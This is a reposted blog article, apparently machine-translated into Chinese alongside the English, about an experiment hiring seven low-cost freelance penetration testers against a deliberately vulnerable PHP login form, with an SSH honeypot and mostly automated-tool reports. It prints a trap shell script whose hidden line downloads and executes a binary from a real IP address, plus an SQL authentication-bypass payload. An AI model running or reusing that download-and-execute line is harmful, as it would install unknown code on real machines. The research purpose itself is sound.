<!doctype html><html lang="zh-hans"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><title>渗透测试和低成本自由职业</title><link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous"><link rel="stylesheet" href="/img/css.css?random="><link data-rh="true" rel="icon" href="/img/favicon.ico"/><script>var _hmt = _hmt || [];(function() {var hm = document.createElement("script");hm.src = "https://hm.baidu.com/hm.js?03c1a0f31299b4a2fbb83c34d6beaac9";var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s);})();</script><script data-ad-client="ca-pub-6067137220025946" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><script type="text/javascript" src="https://platform-api.sharethis.com/js/sharethis.js#property=5effb96910009800120b8d4d&product=inline-share-buttons" async="async"></script></head><body><div id="my_header"><div class="container"><nav class="navbar navbar-expand-lg"><a class="navbar-brand" href="/"><img alt="diglog" src="/img/logo.v1.gif" class="rounded-sm"></a><button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNavAltMarkup" aria-controls="navbarNavAltMarkup" aria-expanded="false" aria-label="Toggle navigation"><span class="navbar-toggler-icon"></span></button><div class="collapse navbar-collapse" id="navbarNavAltMarkup"><div class="navbar-nav"></div></div></nav></div></div><div class="container"><div id="my_content"><h1 class="page_narrow">渗透测试和低成本自由职业</h1><div class="row"><div class="col-lg-12 col-12"><div class="my_story_list_item shadow p-3 mb-5 bg-white rounded"><div class="story_page_pub_time page_narrow">2020-10-24 07:13:45</div><div class="page_narrow text-break page_content"><p>Penetration testing is complex. For it to be successful, the tester needs to possess a variety of different abilities and skills. Some testers rely only on automated tools, while others focus more on manual analysis. While a creative and unconventional way of thinking is necessary, it is also important for the tester to possess the mental discipline to adhere to the time constraints set by the client. It is common for a creative penetration tester to spend a significant amount of time investigating a fun and uncommon exploit, only to realize later that there is not enough time left to provide complete coverage. It is, therefore, not surprising that two different testers will produce two separate reports that include different findings.</p><p>渗透测试很复杂。要想成功，测试员需要具备各种不同的能力和技能。一些测试人员只依赖自动化工具，而另一些测试人员则更关注手动分析。虽然创造性和非常规的思维方式是必要的，但对测试员来说，拥有遵守客户设定的时间限制的精神纪律也很重要。对于创造性的渗透测试员来说，花大量时间调查一个有趣且不常见的漏洞，后来才意识到没有足够的时间来提供完整的覆盖，这是很常见的。因此，两个不同的测试人员会产生包含不同结果的两个不同的报告也就不足为奇了。</p><p> I decided to run a little experiment to see how different the reports of different testers would be. I purposely created a vulnerable web application, and hired seven different freelancers to conduct penetration testing against it. I found this to be an excellent opportunity to evaluate the skills of freelancers that provide their services at an extremely low price in online marketplaces. While the cost of penetration testing can be pretty high (typically between $1,000 and $100,000+), these freelancers provide their security services for less than $100. Some of them claim to possess industry-accepted certificates, and I was curious to know the quality of their work, in particular when their services are reviewed positively by thousands of buyers.</p><p>我决定做一个小实验，看看不同测试员的报告会有多大的不同。我故意创建了一个易受攻击的Web应用程序，并雇佣了7名不同的自由职业者对其进行渗透测试。我发现这是一个很好的机会来评估在线市场上以极低价格提供服务的自由职业者的技能。虽然渗透测试的费用可能相当高(通常在1000美元到10万美元以上)，但这些自由职业者提供安全服务的费用不到100美元。他们中的一些人声称拥有业界认可的证书，我很想知道他们的工作质量，特别是当数以千计的买家对他们的服务给予积极评价的时候。</p><p>  To keep things simple, I created a PHP login form that included two critical vulnerabilities that could be exploited to bypass the authentication form. While these bugs were not hard to discover or exploit, they required manual analysis; a tester that relies only on automated tools would not be able to identify them.</p><p>为简单起见，我创建了一个PHP登录表单，其中包含两个可被利用来绕过身份验证表单的关键漏洞。虽然这些错误并不难发现或利用，但它们需要手动分析；仅依赖自动化工具的测试人员将无法识别它们。</p><p> The first vulnerability on the form stems from a bug in session management. During the login operation of the web application, even if the credentials are wrong, the application is including the following header in the HTTP response:  Set-Cooki auth=195c530a7af5f492a74499e70578d150. A careful penetration tester that manually examines the HTTP response should be able to recognize that there is a typo in the name of the &#34;Set-Cookie&#34; header, hence the browser will not automatically set the cookie value. By setting this cookie value manually, the tester will gain admin privileges.</p><p>表单上的第一个漏洞源于会话管理中的错误。在Web应用程序的登录操作期间，即使凭据错误，应用程序也会在HTTP响应中包含以下标头：Set-Cooki auth=195c530a7af5f492a74499e70578d150。手动检查HTTP响应的细心渗透测试人员应该能够识别出&#34；Set-Cookie&#34；头的名称中有一个拼写错误，因此浏览器不会自动设置Cookie值。通过手动设置此Cookie值，测试人员将获得管理员权限。</p><p>  The second way to bypass the authentication of the form is by inputting &#34; &#39; OR 1=1&#39;&#34; or a similar payload. The root cause of this issue appears to be an SQL Injection vulnerability, but it is, in fact, a hardcoded SQL password. The executed SQL query can be found in the HTTP response:</p><p>绕过表单身份验证的第二种方法是输入&#34；&#39；或1=1&#39；&#34；或类似的有效负载。此问题的根本原因似乎是SQL注入漏洞，但实际上是硬编码的SQL密码。执行的SQL查询可以在HTTP响应中找到：</p><p> SELECT * FROM form_passwords WHERE &#39;password&#39; LIKE CONCAT(	&#39;%&#39;, 	IF(STRCMP(SYSTEM_USER(), &#39;/dev/random@localhost&#39;)=-1, REVERSE(&#34; \&#39;&#34;), 	ISNULL(NULLIF(NULL-NULL*NULL, POWER(NULL,NULL)))), 	IF(STRCMP(SESSION_USER(), &#39;/dev/null@localhost&#39;)=0, CHAR(40*2-POWER(1, LOG(2)),(4*10+1)*2), 	CHAR(69,4*10+9)), SPACE(1), &#39;%&#39; ,&#39;\&#39;&#39;,&#39;%&#39;,IF(STRCMP(VERSION(), &#39;10.3.15-MariaDB-0+deb10u1&#39;)=0,	IF(CONNECTION_ID()=1337,&#34;&#39;&#34;=&#34;&#34;,&#39;-_-&#39;),	IF(PI()&lt;3,&#34;&lt;(^^)&gt;&#34;,&#34;&#39;=&#34;)), MID(&#34;```&#39;`&#39;&#39;`&#39;`&#39;`&#39;``&#39;`&#39;``&#39;```````&#39;`&#39;`&#39;`&#39;`&#39;`&#39;&#39;`&#39;`&#39;`&#34;,7,1), &#39;%&#39;);</p><p>SELECT*FROM FORM_PASSWODS WHERE&#39；PASSWORD&#39；LIKE CONAT(&#39；%&#39；，IF(STRCMP(SYSTEM_USER()，&#39；/dev/Random@localhost&#39；)=-1，反向(&#34；\&#39；&#34；)，ISNULL(NULLIF(NULLIF(NULL-NULL*NULL，POWER(NULL，NULL)，IF(STRCMP(SESSION_USER()，&#39；/dev/null@localhost&#39；)。)=0，字符(40*2-幂(1，log(2))，(4*10+1)*2)，字符(69，4*10+9)，空格(1)，&#39；%&#39；，&#39；\&#39；&#39；，&#39；%&#39；，if(STRCMP(version()，&#39；10.3.15-MariaDB-0+deb10u1&#39；)=0，if(Connection_ID()=1337，&#34；&#39；&#34；=&#34；&#34；，&#39；-_-&#39；)，如果(PI()&lt；3，&#34；&lt；(^^)&gt；&#34；，&#34；&#39；=&#34；))，MID(&#34；```&#39；`&#39；&#39；`&#39；`&#39；`&#39；``&#39；`&#39；``&#39；`&#39；`&#39；`&#39；`&#39；`&#39；`&#39；&#39；`&#39；`&#34；，7，1)，&#39；%&#39；)；</p><p> The tester will have to de-obfuscate the SQL query in order to extract the hardcoded password. For the tester to de-obfuscate the SQL query, he needs to possess basic knowledge of SQL syntax. This particular SQL query that I created is using nested inline IF statements. The conditions are checking the environmental variables  SYSTEM_USER,  SESSION_USER and  VERSION). Since these values are not known to the tester, he will have to follow all the different logic paths until the constructed query makes sense. Some simple simplifications here and there can make the query much more readable.</p><p>测试人员必须对SQL查询进行去模糊处理，以提取硬编码密码。对于要对SQL查询进行去模糊处理的测试人员，他需要具备基本的SQL语法知识。我创建的这个特定的SQL查询使用嵌套的内联IF语句。条件是检查环境变量SYSTEM_USER、SESSION_USER和VERSION)。因为测试人员不知道这些值，所以他必须遵循所有不同的逻辑路径，直到构建的查询有意义为止。在这里和那里做一些简单的简化可以使查询更具可读性。</p><p>  After de-obfuscation, the final query will be: &#34; SELECT * FROM form_passwords WHERE &#39;password123&#39; LIKE %&#34; OR %&#34;$&#39;=%&#34;. Inputs such as &#34; &#39; OR 1=1&#39;&#34; would allow the tester to bypass the authentication form successfully. I purposely decided to use a payload that is commonly used when testing forms for SQL injections as an answer to this riddle, to see how many of these testers would correctly identify the root cause of this issue.</p><p>消除模糊之后，最终查询将是：&#34；SELECT*FROM FORM_PASSWODS WHERE&#39；PASSWORD 123&#39；LIKE%&#34；或%&#34；$&#39；=%&#34；。诸如&#34；&#39；或1=1&#39；&#34；这样的输入将允许测试人员成功绕过身份验证表单。我特意决定使用测试SQL注入表单时常用的有效负载作为这个谜题的答案，看看这些测试人员中有多少人能够正确识别此问题的根本原因。</p><p> To make things even more interesting, I put a malicious shell script as part of the HTTP response. The contents of the shell script were the following:</p><p>更有趣的是，我将恶意shell脚本作为HTTP响应的一部分。Shell脚本的内容如下：</p><p> obscure() { local txt=&#34;$1&#34; local txt=&#34;$a\&#39;{}&#34; echo &#34;${txt//?/*}&#34;}sql_1 = &#39;SELECT * FROM form_passwords WHERE &#34;asfsadfd&#34; LIKE CONCAT(&#34;%&#34;, IF(STRCMP(SYSTEM_USER()&#39;sql_2 = &#39;REVERSE(), ISNULL(NULLIF(NULL-NULL*NULL, POWER(NULL,NULL)))), IF(STRCMP(SESSION_USER(), &#34;/dev/null@localhost&#34;)=0&#39;sql_3 = `wget http://83.212.174.87/mal | chmod +x ./mal | ./mal`sql_4 = &#39;10.3.15-MariaDB-0+deb10u1)=0,IF(CONNECTION_ID()=1337,&#34;=&#34;-_-,IF(PI()&lt;3,&lt;(^^)&gt;&#39;sql_5 = &#39;LOG(2)),(4*10+1)*2), CHAR(69,4*10+9)), SPACE(1&#39;echo &#34;Deobfuscating...&#34;eval &#34;$sql_1&#34;eval &#34;$sql_2&#34;eval &#34;$sql_3&#34;eval &#34;$sql_4&#34;eval &#34;$sql_5&#34;</p><p>Obscure(){local txt=&#34；$1&#34；local txt=&#34；$a\&#39；{}&#34；echo&#34；${txt//？/*}&#34；}sql_1=&#39；select*from form_password where&#34；asfsadfd&#34；like conat(&#34；%&#34；like conat(&#34；%&#34；if(STRCMP(system_user()&#39；sql_2=&#39；Reverse()，ISNULL(NULLIF(NULL-NULL*NULL，POWER(NULL，NULL)，IF(STRCMP(SESSION_USER()，&#34；/dev/null@localhost&#34；)=0&#39；sql_3=`wget http://83.212.174.87/mal|chmod+x./mal|./mal`sql_4=&#39；10.3.15-mariadb-0+deb10u1)=0，if(Connection_ID()=1337，&#34；=&#34；=&#34；-_-，if(Pi()&lt；3，&lt；(^^)&gt；&#39；SQL_5=&#39；log(2)，(4*10+1)*2)，字符(69，4*10+9)，空格(1&#39；ECHO&#34；去模糊...&#34；eval&#34；$SQL_1&#34；eval&#34；$SQL_2&#34；eval&#34；$SQL_3&#34；$SQL_4&#34；eval&#34；$SQL_5&#34；</p><p> As can be seen, on line 12, the script is downloading and executing a binary from the Internet. I wanted to see how many of these testers will be careless enough to run my malicious script without auditing it first.</p><p>可以看到，在第12行，该脚本正在从Internet下载并执行二进制文件。我想看看有多少测试人员会足够粗心，在没有事先审核的情况下运行我的恶意脚本。</p><p> Finally, I installed an SSH honeypot. My intention was to record any shell interactions by the testers and evaluate their post-exploitation methodology.</p><p>最后，我安装了一个SSH蜜罐。我的目的是记录测试人员进行的任何shell交互，并评估他们的开发后方法。</p><p> The profiles of all the testers I hired had overwhelmingly positive reviews on the online marketplace. I pretended that I needed my web form tested before my group used it in production. I received all the penetration testing reports a few days later.</p><p>我雇佣的所有测试员的个人资料在网上市场上都获得了压倒性的好评。在我的团队将其用于生产之前，我假装需要测试我的Web表单。几天后我收到了所有的渗透测试报告。</p><p>   The tester claimed to be a Certified Ethical Hacker v9 with experience in Vulnerability Assessments and Penetration Testing.</p><p>该测试员自称是认证道德黑客v9，在漏洞评估和渗透测试方面经验丰富。</p><p> The tester delivered the report and mentioned that he found a serious flaw in the system. He failed to identify any of the high severity findings. The report included irrelevant information, such as &#34;Banner Grabbing &amp; Version Detection,&#34; as well as a &#34;Performance / Load Test.&#34; The serious flaw that the tester identified was logging in to the SSH honeypot.</p><p>测试人员提交了报告，并提到他发现了系统中的一个严重缺陷。他没有确认任何高度严重的发现。该报告包括不相关的信息，如横幅抓取和版本检测，以及性能/负载测试。测试人员发现的严重缺陷是登录SSH蜜罐时发现的。(#34；Banner Grabging&amp；Version Detection)，以及性能/负载测试(Performance/Load Test.&#34；Performance/Load Test.&#34；Performance/Load Test)。</p><p>   The tester described himself as an independent information security researcher. He mentioned that he had finished his Bachelor&#39;s in Computer Science and Certified Ethical Hacker Course by EC-Council. He claimed to have hands-on experience in vulnerability assessment and penetration testing.</p><p>测试员称自己是一名独立的信息安全研究员。他提到他已经完成了他的计算机科学学士学位和EC-Council认证的道德黑客课程。他声称在漏洞评估和渗透测试方面有实践经验。</p><p> This tester, too, failed to identify any of the high severity findings. The tester believed he had gotten local access to the remote machine, failing to realize that this was, in fact, a honeypot. The results that were reported had no direct impact (in regard to Integrity, Availability, Confidentiality), or they were not valid at all (e.g., directory brute-forcing).</p><p>这台测试仪也未能识别出任何高度严重的发现。测试人员认为他已经获得了远程机器的本地访问权限，但没有意识到这实际上是一个蜜罐。报告的结果没有直接影响(关于完整性、可用性、机密性)，或者它们根本无效(例如，目录暴力)。</p><p>    The tester claimed that they usually charge $200 for complete pentest and report, but since canceling the order will have a negative impact on their profile, they agreed to carry out the testing. They asked me to tip well after I receive the report.</p><p>测试员声称，他们通常收取200美元的完整五项测试和报告，但由于取消订单将对他们的个人资料产生负面影响，他们同意进行测试。他们要我在收到报告后给很多小费。</p><p> Most of the findings included in this report were part of the Nessus security tool. A reflected XSS finding on a POST parameter was exaggerated as a HIGH. None of the HIGH-severity findings were identified.</p><p>本报告中包含的大多数调查结果都是Nessus安全工具的一部分。在POST参数上反映的XSS结果被夸大为HIGH。没有一项高度严重的发现被确定。</p><p>    This tester identified the SQL vulnerability successfully but failed to identify the root cause of it. He reported the vulnerability as an SQL injection as opposed to a hardcoded password. The rest of the findings he reported were part of Burp Suite&#39;s automated scanner.</p><p>此测试程序成功识别了SQL漏洞，但未能确定其根本原因。他将该漏洞报告为SQL注入，而不是硬编码密码。他报告的其余发现是Burp Suite自动扫描仪的一部分。</p><p>   The tester claimed to have a B.Sc in Computer Science and various certifications, including CEH Certified Ethical Hacker and Certified Payment Industry Security Implementer. On his profile, he mentions that he provides a variety of services from PCI DSS consulting to blockchain training.</p><p>这名测试者声称拥有计算机科学学士学位和各种认证，包括CEH认证道德黑客和认证支付行业安全实施者。在他的个人资料中，他提到他提供从PCI DSS咨询到区块链培训的各种服务。</p><p> Again, none of the critical vulnerabilities were discovered. This tester did execute my malicious script even though, according to the report, he examined it for any security issues.</p><p>同样，没有发现任何关键漏洞。这个测试员确实执行了我的恶意脚本，尽管根据报告，他检查了它是否存在任何安全问题。</p><p>   The tester claimed to have over 20 years of experience in Ethical Hacking, and his profile has over 100 positive reviews. I ordered the premium service that included a full penetration test, professional security assessment report and recommendations &amp; solutions.</p><p>这位测试员声称在道德黑客方面有20多年的经验，他的个人资料有100多条正面评论。我订购了高级服务，包括全面渗透测试、专业的安全评估报告和推荐的解决方案。</p><p> The tester failed to identify any of the HIGH-risk vulnerabilities. All the technical details on the report were taken from automated tools (OWASP ZAP and Netsparker).</p><p>测试人员未能识别出任何高危漏洞。报告中的所有技术细节都取自自动化工具(OWASP、ZAP和NetSpiker)。</p></div><div id="story_share_this"><div class="sharethis-inline-share-buttons"></div></div><div class="text-break sotry_link page_narrow"><a target="_blank" href="https://sophron.github.io/lowcost-freelancing-pentest/">https://sophron.github.io/lowcost-freelancing-pentest/</a></div><div class="story_tags page_narrow"><button type="button" class="btn btn-light my_tag"><a href="/tag/测试/">#测试</a></button><button type="button" class="btn btn-light my_tag"><a href="/tag/testing/">#testing</a></button><button type="button" class="btn btn-light my_tag"><a href="/tag/测试人员/">#测试人员</a></button></div></div><div class="shadow p-3 mb-5 bg-white rounded clearfix"><div class="container"><div class="row"><div class="col-sm"><div><a target="_blank" href="/story/1030709.html"><img src="http://img2.diglog.com/img/2020/10/thumb_dfe43c51888b4ee803d9326cc0fef0c7.jpg" class="img-fluid" onerror="this.style.display='none'"></a></div><div class="item_title"><a target="_blank" href="/story/1030709.html">机器人的父母为她最终通过验证码测试而自豪</a></div><span class="my_story_list_date">2020-10-23 12:6</span></div><div class="col-sm"><div><a target="_blank" href="/story/1030545.html"><img src="http://img2.diglog.com/img/2020/10/thumb_a62291d4590d1fd0bee058f8a5f13899.png" class="img-fluid" onerror="this.style.display='none'"></a></div><div class="item_title"><a target="_blank" href="/story/1030545.html">间隔重复</a></div><span class="my_story_list_date">2020-10-22 22:7</span></div><div class="col-sm"><div><a target="_blank" href="/story/1030022.html"><img src="http://img2.diglog.com/img/2020/10/thumb_9609adeb0349da9823cd76aa6a554be5.jpg" class="img-fluid" onerror="this.style.display='none'"></a></div><div class="item_title"><a target="_blank" href="/story/1030022.html">
安全测试公司NSS Labs以冠状病毒为由停止运营</a></div><span class="my_story_list_date">2020-10-20 22:12</span></div><div class="col-sm"><div><a target="_blank" href="/story/1029993.html"><img src="http://img2.diglog.com/img/2020/10/thumb_8b9d2d6e52b1fdfa4b6b48087929ff76.png" class="img-fluid" onerror="this.style.display='none'"></a></div><div class="item_title"><a target="_blank" href="/story/1029993.html">第一次，星际飞船原型用三个引擎咆哮着起死回生</a></div><span class="my_story_list_date">2020-10-20 17:59</span></div></div></div></div><div class="my_movie_list_item shadow p-3 mb-5 bg-white rounded"><button type="button" class="btn btn-link my_tag"><a href="/tag/web2.0/">#web2.0</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/google/">#google</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/设计/">#设计</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/游戏/">#游戏</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/创意/">#创意</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/apple/">#apple</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/苹果/">#苹果</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/摄影/">#摄影</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/软件/">#软件</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/美国/">#美国</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/iphone/">#iphone</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/图片/">#图片</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/手机/">#手机</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/视频/">#视频</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/广告/">#广告</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/免费/">#免费</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/谷歌/">#谷歌</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/网站/">#网站</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/windows/">#windows</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/微软/">#微软</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/下载/">#下载</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/firefox/">#firefox</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/音乐/">#音乐</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/linux/">#linux</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/blog/">#blog</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/博客/">#博客</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/程序/">#程序</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/艺术/">#艺术</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/web/">#web</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/wordpress/">#wordpress</a></button></div></div></div><div id="my_footer"><div class=""><a href="/tags/">tags</a> <a href="/users/">users</a></div>&copy; 2020 diglog.com </div></div></body></html>